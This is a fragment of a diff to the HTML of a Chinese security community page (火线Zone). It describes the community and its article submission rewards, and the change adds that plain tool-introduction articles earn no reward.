 &lt;p&gt;通过火线Zone内容社区、火线技术沙龙等形式，为技术专家提供最前沿的技术分享和交流。目前，火线Zone社区成员已超过20000人的规模，其中不乏来自腾讯、华为、Gitlab、绿盟、去哪儿等知名企业的CTO、CISO、安全VP、安全技术专家等，通过社群和活动讨论交流安全攻防、黑客溯源、企业安全管理、安全运营、软件应用安全、云计算安全等方向技术话题。&lt;/p&gt;
 
@@ -3848,7 +4450,7 @@ Options:
 &lt;li&gt;优秀奖励：文章内容符合社区征稿意向，内容充实有新意可获优秀文章奖励（50查克拉积分 + 500RMB）。&lt;/li&gt;
 &lt;li&gt;精华奖励：最新的事件分析和安全预警，分享业内前沿最新技术、 0day 分析与利用、个人安全开发研究新成果 等方面的奇技淫巧、心经等可获加精文章奖励(（100查克拉 + 1000RMB）。&lt;/li&gt;
 &lt;li&gt;精华奖励：发布文章并获取精华标签后，可以直接加入渗透测试、APP安全、IOT安全、威胁情报、红蓝对抗等相关领域核心众测群，参与平台私密众测项目。&lt;/li&gt;
-&lt;li&gt;无奖励：内容深度较浅或网上有一定公开类似，则不予奖励。&lt;/li&gt;&lt;/ol&gt;
+&lt;li&gt;无奖励：内容深度较浅或网上有一定公开类似、单纯的工具介绍使用则不予奖励。&lt;/li&gt;&lt;/ol&gt;
 
 &lt;p&gt;内容奖励要求：&lt;/p&gt;
 &lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;基础奖励在内容符合要求的前提下，阅读量不做要求&lt;/li&gt;
